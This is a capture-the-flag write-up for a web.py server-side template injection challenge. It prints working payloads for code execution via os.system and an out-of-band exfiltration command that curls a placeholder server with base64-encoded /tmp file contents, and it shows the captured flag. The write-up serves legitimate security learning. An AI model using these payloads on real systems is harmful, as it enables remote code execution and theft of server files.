A simple SSTI challenge
```py
import web
from web import form
web.config.debug = False

FLAG = open("/tmp/flag.txt").read()
.
.
.
    def POST(self):
        f = temptation_Form()
        if not f.validates():
            return render.index(f)
        i = web.input()
        temptation = i.temptation
        if 'flag' in temptation.lower():
            return "Too tempted!"
        try:
            temptation = web.template.Template(f"Your temptation is: {temptation}")()
        except Exception as  e:
            return "Too tempted!"
        if str(temptation) == "FLAG":
            return FLAG
        else:
            return "Too tempted!"
application = app.wsgifunc()
.
.
.
```

I first tested the exploit on my local machine for better visualization.

I modified the code as follows:
```py
temptation = web.template.Template(f"Your temptation is: {temptation}")()
print(str(temptation) == "FLAG")
```
When I used the payload ${7*7}, the output was:
```
Your temptation is: 49
False
```
Next, I attempted command execution using the payload temptation=$`{__import__('os').system('id')}` and received:
```
uid=1000(nguyenlong05) gid=1000(nguyenlong05) groups=1000(nguyenlong05),4(adm),24(cdrom),27(sudo),30(dip),44(video),46(plugdev),100(users),114(lpadmin),124(wireshark),995(input)
Your temptation is: 0

False
```

To extract the flag, I used an oob technique with the following payload: `temptation=${__import__('os').system('curl+https://my_sever_ip_address/$(cat+/tmp/*|+base64)')}`

```
127.0.0.1:41184 - - [02/Feb/2025 14:05:48] "HTTP/1.1 GET /RU5Pe1QzTV9QbDRUXzNTXzRyM19TM2NVcmUhIX0=" - 404 Not Found
```
Flag: `ENO{T3M_Pl4T_3S_4r3_S3cUre!!}`
